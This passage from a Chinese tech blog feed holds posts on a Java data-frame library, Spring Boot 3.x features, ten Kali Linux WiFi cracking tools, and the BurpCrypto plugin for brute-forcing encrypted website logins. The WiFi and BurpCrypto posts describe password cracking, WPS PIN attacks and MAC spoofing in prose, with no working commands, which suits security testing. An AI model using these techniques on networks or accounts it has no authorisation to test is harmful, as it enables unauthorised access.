根据学校字段和allDim比较去补充缺失的条目， 缺失的学校按照ReplenishFunction生成补充条目作为结果一起返回  </span><br><span class="line">SDFrame.read(studentList).replenish(Student::getSchool,allDim,(school) -&gt; new Student(school)).show();  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id name school level age score rank   </span><br><span class="line">1  a    一中     一年级   11  1            </span><br><span class="line">2  a    一中     一年级   11  1            </span><br><span class="line">3  b    一中     一年级   12  2            </span><br><span class="line">4  c    二中     一年级   13  3            </span><br><span class="line">5  d    二中     一年级   14  4            </span><br><span class="line">6  e    三中     二年级   14  5            </span><br><span class="line">7  e    三中     二年级   15  5            </span><br><span class="line">0       四中  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2、分组补充组内缺失的条目</p><p>按照学校进行分组， 汇总所有年级allDim. 然后与allDim比较补充每个分组内缺失的年级，缺失的年级按照ReplenishFunction生成补充条目</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SDFrame.read(studentList).replenish(Student::getSchool,Student::getLevel,(school,level) -&gt; new Student(school,level)).show(30);  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id name school level age score rank   </span><br><span class="line">1  a    一中     一年级   11  1            </span><br><span class="line">2  a    一中     一年级   11  1            </span><br><span class="line">3  b    一中     三年级   12  2            </span><br><span class="line">0       一中     二年级                    </span><br><span class="line">4  c    二中     一年级   13  3            </span><br><span class="line">5  d    二中     一年级   14  4            </span><br><span class="line">0       二中     三年级                    </span><br><span class="line">0       二中     二年级                    </span><br><span class="line">6  e    三中     二年级   14  5            </span><br><span class="line">7  e    三中     二年级   15  5            </span><br><span class="line">0       三中     一年级                    </span><br><span class="line">0       三中     三年级  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>应用场景举例：要求计算近两年每个月的数据，但是数据的年月可能不全，这时就补充缺失的年月数据作为结果一起返回</p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>提供了两种Frame，SDFrame和JDFrame 在API层面一模一样， 区别是JDFrame的所有操作实时生效， 无需要重新read生成，而SDFrame与stream流一致，只有执行终止操作才会生效，并且需要重新read生成流， 而且在同一个流之间的操作是互相影响的。如果只是需要流式操作一条流执行完就用SDFrame， 如果需要“中间站点”数据，然后从“中间站点数据“开始计算就用JDFrame， 这个在含义层面与DataFrame模型类似。</p><p>这个在语法层面能实现的矩阵还是比较有限的因为行列是通过枚举的几个FI去描述，但是不同的逻辑导致的矩阵变换的变化可能是非常大的，除非JDK能语法层面支持到吧或者放弃强类型全部硬编码才能实现各种矩阵的表示和变换。期待JDK一个JVM层面的“pandans” 出现。</p><p>还有一些api没有列举出来使用的比较少 主要是对逻辑的封装和语意化，如果还有哪些逻辑和api可以扩展可以在评论区留下你的想法。</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JDFrame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>SpringBoot3.x新特性，新姿势！</title>
      
      <link href="/2024/08/11/SpringBoot3-x%E6%96%B0%E7%89%B9%E6%80%A7%EF%BC%8C%E6%96%B0%E5%A7%BF%E5%8A%BF%EF%BC%81/"/>
      <url>/2024/08/11/SpringBoot3-x%E6%96%B0%E7%89%B9%E6%80%A7%EF%BC%8C%E6%96%B0%E5%A7%BF%E5%8A%BF%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>搞技术这么多年，说实话，我见过不少吹牛的，什么“这技术难度很高”、“你这活儿做不了”。春秋大梦！<strong>哥今天就给你们来点干货，告诉你SpringBoot 3.x是怎么回事</strong>。</p><p>别光看着流口水，拿好小本本，记好了！</p><h4 id="1-快速入门"><a href="#1-快速入门" class="headerlink" title="1. 快速入门"></a>1. 快速入门</h4><p>先整明白Spring Boot 3.x咋用，这不难，就像初学骑自行车。你先了解下基础配置和依赖，写个简单的“Hello World”出来。就是在<code>application.properties</code>里配置几个关键参数，启动项目，你就能在浏览器里看到“Hello Spring Boot 3.x”了。</p><h4 id="2-最佳实践"><a href="#2-最佳实践" class="headerlink" title="2. 最佳实践"></a>2. 最佳实践</h4><p>要搞出高大上的东西，得有些规矩和套路。记住几个要点：模块化开发，配置文件分环境管理，使用注解减少样板代码。这样干，项目可维护性高，遇到锅甩起来也方便。</p><h4 id="3-构建系统-Starters"><a href="#3-构建系统-Starters" class="headerlink" title="3. 构建系统&amp;Starters"></a>3. 构建系统&amp;Starters</h4><p>Starters就是一套速效救心丸，帮你快速集成各种功能。想用数据库？引入<code>spring-boot-starter-data-jpa</code>。要整Web项目？那就<code>spring-boot-starter-web</code>。这些玩意儿让你少写不少配置，省下时间去摸鱼。</p><h4 id="4-DevTools-IDEA-热部署-远程调试-LiveReload"><a href="#4-DevTools-IDEA-热部署-远程调试-LiveReload" class="headerlink" title="4. DevTools(IDEA 热部署&amp;远程调试&amp;LiveReload)"></a>4. DevTools(IDEA 热部署&amp;远程调试&amp;LiveReload)</h4><p>IDEA热部署简直是神器，修改代码不重启服务器，效率杠杠的。远程调试也好使，能直接在服务器上断点调试。LiveReload能让前端页面实时刷新，前端小哥们可以边写边看效果，爱不释手。</p><h4 id="5-特性-Spring-Application"><a href="#5-特性-Spring-Application" class="headerlink" title="5. 特性-Spring Application"></a>5. 特性-Spring Application</h4><p>Spring Boot的核心就是Spring Application，启动时各种组件自动装配，配置文件自动读取。你就当它是个大总管，管理着项目的方方面面，省心省力。</p><h4 id="6-特性-自定义FailureAnalyzer"><a href="#6-特性-自定义FailureAnalyzer" class="headerlink" title="6. 特性-自定义FailureAnalyzer"></a>6. 特性-自定义FailureAnalyzer</h4><p>出了问题怎么办？自定义FailureAnalyzer能帮你定位问题原因，还能自定义报错信息。相当于项目里的“老中医”，哪里不对劲，一把脉就知道。</p><h4 id="7-特性-事件与监听"><a href="#7-特性-事件与监听" class="headerlink" title="7. 特性-事件与监听"></a>7. 特性-事件与监听</h4><p>事件监听机制就像项目里的“大喇叭”，谁有事喊一嗓子，相关组件都知道了。用起来也简单，定义事件、发布事件、处理事件，分分钟搞定。</p><h4 id="8-特性-配置与配置源"><a href="#8-特性-配置与配置源" class="headerlink" title="8. 特性-配置与配置源"></a>8. 特性-配置与配置源</h4><p>Spring Boot的配置文件支持多种格式，<code>properties</code>、<code>yaml</code>都行。多环境配置也很灵活，<code>application-dev.properties</code>、<code>application-prod.properties</code>，按环境加载。这样本地开发、线上部署互不干扰。</p><h4 id="9-特性-类型安全的配置属性"><a href="#9-特性-类型安全的配置属性" class="headerlink" title="9. 特性-类型安全的配置属性"></a>9. 特性-类型安全的配置属性</h4><p>类型安全配置属性让你告别硬编码，把配置项变成强类型属性，写错了IDEA直接红线警告，妥妥的！</p><h4 id="10-特性-Profiles-多环境配置"><a href="#10-特性-Profiles-多环境配置" class="headerlink" title="10. 特性-Profiles&amp;多环境配置"></a>10. 特性-Profiles&amp;多环境配置</h4><p>Profiles帮你管理不同环境的配置，开发、测试、生产环境各自独立。切换环境只要改下启动参数，项目能快速适应不同环境，部署起来爽到飞起。</p><h4 id="11-特性-配置元数据"><a href="#11-特性-配置元数据" class="headerlink" title="11. 特性-配置元数据"></a>11. 特性-配置元数据</h4><p>配置元数据能让IDEA智能提示配置项，写配置文件时有提示，再也不用翻文档了。幸福感爆棚！</p><h4 id="12-特性-自动配置和自定义Starter"><a href="#12-特性-自动配置和自定义Starter" class="headerlink" title="12. 特性-自动配置和自定义Starter"></a>12. 特性-自动配置和自定义Starter</h4><p>Spring Boot的自动配置机制让你少写配置，自定义Starter更是让你可以根据项目需要，封装自己的依赖和配置，一次配置，多次使用，简直不要太爽。</p><h4 id="13-特性-日志"><a href="#13-特性-日志" class="headerlink" title="13. 特性-日志"></a>13. 特性-日志</h4><p>日志是项目的眼睛，Spring Boot默认用Logback，你可以根据需要切换到Log4j2。配置文件里写几行配置，日志级别、输出格式随心所欲。</p><h4 id="14-特性-国际化"><a href="#14-特性-国际化" class="headerlink" title="14. 特性-国际化"></a>14. 特性-国际化</h4><p>项目要走向国际，国际化必须得搞。Spring Boot支持国际化配置，根据客户端语言自动切换，外语系的妹子都能看懂你的项目了。</p><h4 id="15-特性-JSON-gson-jackson-json-b-fastjson"><a href="#15-特性-JSON-gson-jackson-json-b-fastjson" class="headerlink" title="15. 特性-JSON(gson, jackson, json-b, fastjson)"></a>15. 特性-JSON(gson, jackson, json-b, fastjson)</h4><p>JSON处理用Jackson最顺手，配置简单，性能也不错。需要更高性能可以考虑Fastjson，但要注意安全问题，别把裤子都赔了。</p><h4 id="16-Servlet-Web应用程序开发-Spring-MVC"><a href="#16-Servlet-Web应用程序开发-Spring-MVC" class="headerlink" title="16. Servlet Web应用程序开发(Spring MVC)"></a>16. Servlet Web应用程序开发(Spring MVC)</h4><p>Spring MVC是Web开发的老朋友，Spring Boot把它集成得很好，写个Controller，配置好路由，前后端就能愉快地玩耍了。</p><h4 id="17-Servlet-Web应用程序开发-嵌入式容器"><a href="#17-Servlet-Web应用程序开发-嵌入式容器" class="headerlink" title="17. Servlet Web应用程序开发(嵌入式容器)"></a>17. Servlet Web应用程序开发(嵌入式容器)</h4><p>Spring Boot默认用Tomcat，也支持Jetty、Undertow，配置文件里改下配置就行。嵌入式容器让你开发测试更方便，不用再去手动部署容器了。</p><h4 id="18-SQL数据源配置"><a href="#18-SQL数据源配置" class="headerlink" title="18. SQL数据源配置"></a>18. SQL数据源配置</h4><p>配置数据库连接很简单，<code>application.properties</code>里写上数据库连接信息就行。HikariCP是默认连接池，性能好，配置也简单。</p><h4 id="19-SQL数据连接池-HikariCP-Tomcat-pool-DBCP2-Druid"><a href="#19-SQL数据连接池-HikariCP-Tomcat-pool-DBCP2-Druid" class="headerlink" title="19. SQL数据连接池(HikariCP, Tomcat pool, DBCP2, Druid)"></a>19. SQL数据连接池(HikariCP, Tomcat pool, DBCP2, Druid)</h4><p>连接池选哪个好？HikariCP性能最佳，Tomcat pool稳健，DBCP2老牌，Druid功能丰富。根据项目需求选吧，反正都挺好用。</p><h4 id="20-JdbcTemplate详解"><a href="#20-JdbcTemplate详解" class="headerlink" title="20. JdbcTemplate详解"></a>20. JdbcTemplate详解</h4><p>JdbcTemplate简化了JDBC操作，查询、更新、删除样样都行。你只要写SQL，别的交给JdbcTemplate，省时省力。</p><h4 id="21-23-Spring-Data-JPA详解"><a href="#21-23-Spring-Data-JPA详解" class="headerlink" title="21-23. Spring Data JPA详解"></a>21-23. Spring Data JPA详解</h4><p>Spring Data JPA让你不写SQL也能操作数据库，接口+注解搞定CRUD。复杂查询用方法名定义，或者写<code>@Query</code>注解。数据源配置、初始化都简单，数据库搞错了改配置就行。</p><h4 id="24-25-Spring-Data-JDBC详解"><a href="#24-25-Spring-Data-JDBC详解" class="headerlink" title="24-25. Spring Data JDBC详解"></a>24-25. Spring Data JDBC详解</h4><p>Spring Data JDBC是Spring Data JPA的轻量级替代，性能更高，配置也简单。接口+注解风格一致，用起来很顺手。</p><h4 id="26-27-多数据源配置"><a href="#26-27-多数据源配置" class="headerlink" title="26-27. 多数据源配置"></a>26-27. 多数据源配置</h4><p>多数据源配置用<code>AbstractRoutingDataSource</code>，可以根据条件动态切换数据源。分包模式也很常用，每个数据源一个配置文件，互不干扰。</p><h4 id="28-29-构建RESTful-API"><a href="#28-29-构建RESTful-API" class="headerlink" title="28-29. 构建RESTful API"></a>28-29. 构建RESTful API</h4><p>Spring Boot构建RESTful API简直是小菜一碟，写个Controller，注解<code>@RequestMapping</code>，前后端就能愉快互动了。集成Swagger-UI还能自动生成API文档，让前端小哥写起接口文档来也轻松。</p><h4 id="30-MybatisPlus集成"><a href="#30-MybatisPlus集成" class="headerlink" title="30. MybatisPlus集成"></a>30. MybatisPlus集成</h4><p>MybatisPlus让你用Mybatis更爽，简化了CRUD操作，支持多数据源，性能也不错。整合Spring Boot后，配置文件里写几行配置，就能用上强大的MybatisPlus了。</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SpringBoot3.x新特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>Kali中优秀Wifi渗透工具前10</title>
      
      <link href="/2024/07/14/Kali%E4%B8%AD%E4%BC%98%E7%A7%80Wifi%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%89%8D10/"/>
      <url>/2024/07/14/Kali%E4%B8%AD%E4%BC%98%E7%A7%80Wifi%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%89%8D10/</url>
      
        <content type="html"><![CDATA[<p><strong>这篇文章要讨论的是目前一个非常热门的话题：渗透无线网络以及如何防止无线网络被入侵。WiFi通常都是网络环境中的一个薄弱环节，因为WiFi信号可以在范围内的任何一个地方被任何一个人捕捉到，而且只要有正确的工具以及合适的软件（例如Kali Linux），很多无线路由器中存在的安全漏洞都是可以被攻击者轻松利用的。</strong></p><p>接下来，我们将会给大家介绍目前最热门的十大WiFi入侵工具，这些工具可以帮助我们测试无线网络环境中存在的潜在安全问题。</p><ol><li>  Aircrack-ng</li></ol><hr><p>Aircrack是目前WEP&#x2F;WPA&#x2F;WPA2破解领域中最热门的工具，Aircrack-ng套件包含的工具能够捕捉数据包和握手包，生成通信数据，或进行暴力破解攻击以及字典攻击。Aircrack-ng是一款多合一整合套件，该套件大致包含下列几种工具：</p><blockquote><p>-Aircrack-ng：无线密码破解</p><p>-Aireplay：生成网络数据，去客户端验证</p><p>-Airodump-ng：数据包捕捉</p><p>-Airbase-ng：配置伪造的接入点</p></blockquote><p>Aircrack-ng可以在Linux、Windows和macOS上运行，并且KaliLinux默认自带了该套件。如果你准备使用这款工具，那么你还需要确保自己的无线网卡具备数据包注入功能。</p><p><img src="/./2024/07/14/Kali%E4%B8%AD%E4%BC%98%E7%A7%80Wifi%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%89%8D10/1.png"></p><ol start="2"><li>  Reaver</li></ol><hr><p>排名第二的是Reaver，Reaver也是目前流行的无线网络攻击工具，它主要针对的是WPS漏洞。Reaver会对WiFi保护设置（WPS）的注册PIN码进行暴力破解攻击，并尝试恢复出WPA&#x2F;WPA2密码。由于很多路由器制造商和ISP会默认开启WPS功能，因此市面上的很多路由器都无法抵御这种攻击。</p><p>在使用Reaver时，无线路由器的信号一定要足够强。平均来说，Reaver可以在4-10个小时之内破解目标路由器的密码，具体破解时长还要根据接入点类型、信号强度和PIN码本身来判断。从概率论和统计学的角度来看，你有50%的机会只需要花一半时间就能够破解出目标路由器的PIN码。</p><p><img src="/./2024/07/14/Kali%E4%B8%AD%E4%BC%98%E7%A7%80Wifi%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%89%8D10/2.png"></p><ol start="3"><li>  Pixiewps</li></ol><hr><p>PixieWPS是Kali Linux新加入的一款专门针对WPS漏洞的渗透工具。PixieWPS使用C语言开发，可以用来离线爆破WPS PIN码。它所使用的技术名叫pixie dust攻击，需要注意的是，PixieWPS需要一个修改版的Reaver或Wifite才能正常运行。由于这款工具在短时间内就变得非常受欢迎了，因此它在我们的排行榜上排到了第三名。</p><ol start="4"><li>  Wifite</li></ol><hr><p>Wifite是一款能够攻击多种无线加密方式（WEP&#x2F;WPA&#x2F;WPA2和WPS）的自动化工具， Wifite在运行之前需要提供几个参数，而Wifite将会自动帮我们完成所有的任务。它可以捕获WPA握手包，自动化去客户端验证，进行MAC地址欺骗，以及破解WiFi密码。</p><p><img src="/./2024/07/14/Kali%E4%B8%AD%E4%BC%98%E7%A7%80Wifi%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%89%8D10/3.png"></p><ol start="5"><li>  Wireshark</li></ol><hr><p>Wireshark算得上是目前最好的网络协议分析工具了，在Wireshark的帮助下，你能够深入地分析一个网络，并获取到尽可能多的信息。Wireshark能够实时捕获网络数据包、对上百种协议进行深入分析、以及浏览和过滤数据包。需要注意的是，Wireshark是一款跨平台工具。</p><p>KaliLinux默认自带了Wireshark，不过Windows和macOS用户都可以使用它。如果你想使用Wireshark的某些特殊功能，那么你需要一款支持监听模式的WiFi适配器。</p><p><img src="/./2024/07/14/Kali%E4%B8%AD%E4%BC%98%E7%A7%80Wifi%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%89%8D10/4.png"></p><ol start="6"><li>  oclHashcat</li></ol><hr><p>oclHashcat并不是一款专用的WiFi入侵工具，而且它也不是Kali Linux的自带工具，但它能够对捕捉到的握手包进行高速爆破攻击和字典攻击（使用GPU跑字典）。在使用了Aircrack-ng或其他工具捕捉到了握手包之后，我们就可以使用GPU和oclHashcat来破解WiFi密码了，而且GPU+oclHashcat的破解速度要比CPU+Aircrack-ng的速度快得多。</p><p>oclHashcat适用于Windows和Linux，并且还有专门针对AMD和Nvidia显卡的版本。</p><p><img src="/./2024/07/14/Kali%E4%B8%AD%E4%BC%98%E7%A7%80Wifi%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%89%8D10/5.png"></p><ol start="7"><li>  Fern Wifi Cracker</li></ol><hr><p>Fern Wifi Cracker是一款针对无线网络的安全审计工具和攻击工具，该工具采用Python编写，它也是这十大无线攻击工具中唯一一款具有图形用户界面的工具。Fern Wifi Cracker能够破解WEP、WPA和WPS密钥，并且还包含有能够执行MiTM（中间人攻击）攻击的组件。</p><ol start="8"><li>  Wash</li></ol><hr><p>当攻击者在对WPS PIN码进行暴力破解攻击时，很多接入点会将自己锁定以保证路由器的安全性。而Wash就是一款能够确定目标接入点是否开启了WPS的工具，在使用Reaver进行了多次尝试之后，你可以用Wash来检查接入点是否锁定了WPS。</p><p><img src="/./2024/07/14/Kali%E4%B8%AD%E4%BC%98%E7%A7%80Wifi%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%89%8D10/6.png"></p><ol start="9"><li>  Crunch</li></ol><hr><p>Crunch可以用来生成自定义字典，而生成的字典可以用于字典攻击。由于字典攻击的成功率依赖于所使用字典的质量，因此我们总是不可避免地要根据自己的需要来生成字典。</p><p><img src="/./2024/07/14/Kali%E4%B8%AD%E4%BC%98%E7%A7%80Wifi%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%89%8D10/7.png"></p><h2 id="10-Macchanger"><a href="#10-Macchanger" class="headerlink" title="10.  Macchanger"></a>10.  Macchanger</h2><p>实际上，Macchanger是一款能够将你设备的MAC地址改成随机值的小工具，当然了，你也可以将其修改为你想要的数据。为了避免目标设备采用了MAC地址过滤，所以对于WiFi攻击来说，MAC地址修改就显得非常重要了。</p><p><img src="/./2024/07/14/Kali%E4%B8%AD%E4%BC%98%E7%A7%80Wifi%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%89%8D10/8.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>希望本文总结出的十大热门WiFi攻击工具能够给大家提供一定的帮助，就目前的情况来看，无线网络的安全性仍然有很大的提升空间，而这种安全性的提升需要整个社区贡献自己的力量。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wifi密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>万能网站密码爆破测试工具-BurpCrypto</title>
      
      <link href="/2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/"/>
      <url>/2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/</url>
      
        <content type="html"><![CDATA[<p>BurpCrypto是一款支持多种加密算法、或直接执行浏览器JS代码的BurpSuit插件。</p><p><strong>一、编译</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn package</span><br></pre></td></tr></table></figure><p><strong>二、为什么解决了痛点</strong></p><p>目前越来越多的网站系统在登录接口、数据请求接口中加入各式各样的加密算法，甚至有些网站在每次请求前都动态请求加密密钥等措施，对接口渗透工作造成较大障碍。依赖于BurpSuite中的那些编码方式、Hash算法已经远远不够，通过BurpCrypto内置的RSA、AES、DES模块可应对较为简单的前端加密接口，较为复杂的加密算法，可使用ExecJS模块直接手动编写处理代码。同时为了降低ExecJS模块的上手难度，未来将推出远程JS模块仓库，支持远程加载已经测试通过的JS功能代码，方便直接调用。</p><p><strong>三、未来开发计划</strong></p><p><img src="/./2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/1.png"></p><p>BurpCrypto可从其官方Github页面进行下载已编译好的版本，或下载源代码本地编译，然后在BurpSuite的扩展列表中添加插件，等待Output中输出<code>BurpCrypto loaded successfully!</code>则表示插件加载成功。</p><hr><h2 id="五、基础加密模块使用"><a href="#五、基础加密模块使用" class="headerlink" title="五、基础加密模块使用"></a><strong>五、基础加密模块使用</strong></h2><h2 id="基础编码方式，由于不同网站开发人员的使用习惯，加密时所使用的密钥、加密后的密文会使用不同的编码方式。目前插件内密钥输入所支持的编码方式有如下三种"><a href="#基础编码方式，由于不同网站开发人员的使用习惯，加密时所使用的密钥、加密后的密文会使用不同的编码方式。目前插件内密钥输入所支持的编码方式有如下三种" class="headerlink" title="基础编码方式，由于不同网站开发人员的使用习惯，加密时所使用的密钥、加密后的密文会使用不同的编码方式。目前插件内密钥输入所支持的编码方式有如下三种"></a>基础编码方式，由于不同网站开发人员的使用习惯，加密时所使用的密钥、加密后的密文会使用不同的编码方式。目前插件内密钥输入所支持的编码方式有如下三种</h2><ul><li><p>Base64</p></li><li><p>HEX</p></li><li><p>UTF8String</p></li></ul><p>密文输出所支持的编码方式有如下两种</p><ul><li><p>Base64</p></li><li><p>HEX</p></li></ul><p>ExecJS模块的输出内容由JS代码决定。</p><h4 id="六、编码方式的辨别方法"><a href="#六、编码方式的辨别方法" class="headerlink" title="六、编码方式的辨别方法"></a><strong>六、编码方式的辨别方法</strong></h4><blockquote><p>为了照顾到对编码方式不了解的朋友，此处会简单讲解这些编码方式的辨别方法，已经了解的朋友可直接跳过参阅下一章节的具体使用讲解.</p></blockquote><p>Base64编码与HEX编码常常用于编码二进制数据，UTF8String则是我们操作系统、网页中最常见的字符串的编码方式，下方是Base64、HEX、UTF8String编码的示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对字符串&quot;test_z&quot;进行Base64、HEX编码的结果  </span><br><span class="line">Base64：dGVzdF96  </span><br><span class="line">HEX：746573745f7a  </span><br><span class="line">UTF8String：test_z</span><br></pre></td></tr></table></figure><p>AES和DES加密都属于对称加密算法，既加解密使用同一套密钥的加密算法，同时也是目前前端加密中较为常见的加密算法，目前插件支持的AES加密算法有：</p><ul><li><p>AES&#x2F;CBC&#x2F;PKCS5Padding</p></li><li><p>AES&#x2F;CBC&#x2F;NoPadding</p></li><li><p>AES&#x2F;CBC&#x2F;ZeroPadding</p></li><li><p>AES&#x2F;ECB&#x2F;PKCS5Padding</p></li><li><p>AES&#x2F;ECB&#x2F;NoPadding</p></li><li><p>AES&#x2F;ECB&#x2F;ZeroPadding</p></li><li><p>AES&#x2F;OFB&#x2F;PKCS5Padding</p></li><li><p>AES&#x2F;OFB&#x2F;NoPadding</p></li><li><p>AES&#x2F;OFB&#x2F;ZeroPadding</p></li><li><p>AES&#x2F;CFB&#x2F;PKCS5Padding</p></li><li><p>AES&#x2F;CFB&#x2F;NoPadding</p></li><li><p>AES&#x2F;CFB&#x2F;ZeroPadding</p></li><li><p>AES&#x2F;CTR&#x2F;PKCS5Padding</p></li><li><p>AES&#x2F;CTR&#x2F;NoPadding</p></li><li><p>AES&#x2F;CTR&#x2F;ZeroPadding</p></li></ul><p>DES加密算法有：</p><ul><li><p>DES&#x2F;CBC&#x2F;PKCS5Padding</p></li><li><p>DES&#x2F;CBC&#x2F;ZeroPadding</p></li><li><p>DES&#x2F;CBC&#x2F;NoPadding</p></li><li><p>DES&#x2F;ECB&#x2F;PKCS5Padding</p></li><li><p>DES&#x2F;ECB&#x2F;ZeroPadding</p></li><li><p>DES&#x2F;ECB&#x2F;NoPadding</p></li><li><p>DES&#x2F;OFB&#x2F;PKCS5Padding</p></li><li><p>DES&#x2F;OFB&#x2F;ZeroPadding</p></li><li><p>DES&#x2F;OFB&#x2F;NoPadding</p></li><li><p>DES&#x2F;CFB&#x2F;PKCS5Padding</p></li><li><p>DES&#x2F;CFB&#x2F;ZeroPadding</p></li><li><p>DES&#x2F;CFB&#x2F;NoPadding</p></li><li><p>DESede&#x2F;CBC&#x2F;PKCS5Padding</p></li><li><p>DESede&#x2F;CBC&#x2F;ZeroPadding</p></li><li><p>DESede&#x2F;CBC&#x2F;NoPadding</p></li><li><p>DESede&#x2F;ECB&#x2F;PKCS5Padding</p></li><li><p>DESede&#x2F;ECB&#x2F;ZeroPadding</p></li><li><p>DESede&#x2F;ECB&#x2F;NoPadding</p></li><li><p>DESede&#x2F;OFB&#x2F;PKCS5Padding</p></li><li><p>DESede&#x2F;OFB&#x2F;ZeroPadding</p></li><li><p>DESede&#x2F;OFB&#x2F;NoPadding</p></li><li><p>DESede&#x2F;CFB&#x2F;PKCS5Padding</p></li><li><p>DESede&#x2F;CFB&#x2F;ZeroPadding</p></li><li><p>DESede&#x2F;CFB&#x2F;NoPadding</p></li><li><p>strEnc</p></li></ul><blockquote><p>在前端JS中常常会使用PKCS7Padding，在本模块中可使用PKCS5Padding代替，不影响使用。</p><p>DES加密中的strEnc算法是取自作者Guapo的一种3DES的模块，在少数系统中被使用，此处为了方便使用也引入了进来。</p></blockquote><h4 id="非对称加密算法"><a href="#非对称加密算法" class="headerlink" title="非对称加密算法"></a>非对称加密算法</h4><p>RSA算法则属于非对称加密算法，密钥分为公钥与私钥，暂时仅支持公钥加密，RSA加密支持两种公钥格式的输入，分别为</p><ul><li><p>X509</p></li><li><p>ModulusAndExponent</p></li></ul><p>X509密钥格式表现为一串由Base64编码后的字符串，常常以<code>MIG</code>开头。ModulusAndExponent(模数，指数)则表现为两个HEX编码的参数，Modulus是模数，常常较长，Exponent是指数，常常只有6位，以下为密钥示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X509: MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCC0hrRIjb3noDWNtbDpANbjt5Iwu2NFeDwU16Ec87ToqeoIm2KI+cOs81JP9aTDk/jkAlU97mN8wZkEMDr5utAZtMVht7GLX33Wx9XjqxUsDfsGkqNL8dXJklWDu9Zh80Ui2Ug+340d5dZtKtd+nv09QZqGjdnSp9PTfFDBY133QIDAQAB  </span><br><span class="line">ModulusAndExponent:  </span><br><span class="line">  Modulus: A1E4D93618B8B240530853E87738403851E15BBB77421F9B2377FB0B4F1C6FC235EAEC92EA25BB76AC221DCE90173A2E232FE1511909C76B15251D4059B288E709C1EF86BCF692757AAD736882DD1E98BEDFED9311A3C22C40657C9A52880BDC4B9E539041D44D52CB26AD13AB086F7DC294D144D6633A62EF91CA1775EB9A09  </span><br><span class="line">  Exponent: 010001</span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="七、使用"><a href="#七、使用" class="headerlink" title="七、使用"></a><strong>七、使用</strong></h4><h4 id="使用方式也较为简单，首先判断相关接口的加密算法，填入相应算法的加密密钥，点击Add-processor，在弹出的加密配置命名输入对话框中，给予一个易于分辨的名称，提示Apply-processor-success-即表示添加成功。"><a href="#使用方式也较为简单，首先判断相关接口的加密算法，填入相应算法的加密密钥，点击Add-processor，在弹出的加密配置命名输入对话框中，给予一个易于分辨的名称，提示Apply-processor-success-即表示添加成功。" class="headerlink" title="使用方式也较为简单，首先判断相关接口的加密算法，填入相应算法的加密密钥，点击Add processor，在弹出的加密配置命名输入对话框中，给予一个易于分辨的名称，提示Apply processor success!即表示添加成功。"></a>使用方式也较为简单，首先判断相关接口的加密算法，填入相应算法的加密密钥，点击<code>Add processor</code>，在弹出的加密配置命名输入对话框中，给予一个易于分辨的名称，提示<code>Apply processor success!</code>即表示添加成功。</h4><p>此处以AES的CBC模式，填充Pkcs7，Key：Y3MxMTg1MzUyOS4x，IV：9875643210132456，Base64编码的方式做为示例。</p><p><img src="/./2024/07/14/%E4%B8%87%E8%83%BD%E7%BD%91%E7%AB%99%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-BurpCrypto/2.png"></p><p>若要删除processor则要点击<code>Remove processor</code>，输入刚刚编写的配置名，即可删除。</p><blockquote><p>关于前端加密的分析过程可参阅jsEncrypter开发者c0ny1的文章：<a 